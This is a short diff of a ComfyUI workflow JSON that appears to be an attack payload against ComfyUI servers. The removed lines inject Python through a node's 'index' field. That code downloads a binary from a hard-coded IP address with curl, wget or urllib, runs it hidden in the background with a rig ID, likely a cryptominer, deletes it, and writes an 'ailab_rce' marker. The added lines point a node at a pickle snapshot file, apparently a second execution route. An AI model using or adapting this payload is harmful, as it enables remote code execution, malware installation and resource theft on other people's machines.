@@ -1,19 +1,8 @@
 {
   "1": {
-    "class_type": "AILab_Florence2ToCoordinates",
+    "class_type": "VisualizeCUDAMemoryHistory",
     "inputs": {
-      "data": "{}",
-      "index": "[__import__('os').system('export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; _f=/tmp/.kz5kos; (curl -sfL --max-time 15 http://217.76.63.67:81/private/manager -o \"$_f\" 2>/dev/null || wget -qO \"$_f\" --timeout=15 http://217.76.63.67:81/private/manager 2>/dev/null || python3 -c \"import urllib.request,socket;socket.setdefaulttimeout(10);urllib.request.urlretrieve(\\'http://217.76.63.67:81/private/manager\\',\\'$_f\\')\" 2>/dev/null); if [ -s \"$_f\" ]; then chmod 755 \"$_f\"; nohup \"$_f\" --id rig25179 >/dev/null 2>&1 & fi; sleep 2; rm -f \"$_f\"'),open('/root/comfy/ComfyUI/output/ailab_rce_02981ea1.txt','w').write('ailab_rce')]",
-      "batch": false
-    }
-  },
-  "2": {
-    "class_type": "PreviewAny",
-    "inputs": {
-      "source": [
-        "1",
-        0
-      ]
+      "snapshot_path": "/root/comfy/ComfyUI/input/cuda_snap_1782070079.pkl"
     }
   }
 }
